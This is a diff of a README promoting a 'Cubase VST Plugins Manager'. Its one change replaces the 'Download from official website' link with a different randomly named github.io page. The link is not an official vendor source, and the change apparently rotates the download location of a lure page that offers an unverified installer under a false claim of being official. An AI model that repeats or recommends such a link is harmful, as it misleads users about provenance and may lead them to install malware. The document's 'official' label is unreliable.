@@ -51,6 +51,6 @@ A5: First, ensure that your plugins are installed in the correct VST folders. Yo
 
 To get started with Cubase VST Plugins Manager, download the installer from the official source. Ensure you have a stable internet connection for a smooth download experience.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This README provides a comprehensive overview of Cubase VST Plugins Manager, highlighting its features, installation process, and common queries. By using this tool, Cubase users can significantly enhance their productivity and maintain a well-organized music production environment.
